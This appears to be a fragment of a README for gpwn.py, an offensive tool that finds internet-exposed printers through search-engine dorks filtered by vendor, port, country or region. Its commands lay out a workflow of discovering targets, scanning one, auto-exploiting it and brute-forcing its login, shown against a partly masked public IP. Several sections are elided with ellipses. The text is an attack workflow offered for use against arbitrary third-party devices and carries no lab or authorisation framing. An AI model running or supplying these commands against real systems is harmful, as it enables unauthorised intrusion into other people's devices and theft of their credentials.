# Online Discovery — Dork Mode (v4.0.0)
...
python gpwn.py --discover-online \
...
python gpwn.py --discover-online --dork-vendor hp --dork-country BR
...
# Single engine
python gpwn.py --discover-online --dork-vendor epson --dork-port 9100 \
  --dork-engine zoomeye
```
...
Engines without valid credentials are silently skipped. Run `python gpwn.py --check-config` to see which engines are active.
...
```bash
# 1. Discover
python gpwn.py --discover-online --dork-vendor epson --dork-region latin_america

# 2. Scan individual result
python gpwn.py 177.X.X.X --scan

# 3. Auto exploit
python gpwn.py 177.X.X.X --auto-exploit

# 4. Brute-force login
python gpwn.py 177.X.X.X --bruteforce --bf-vendor epson
```
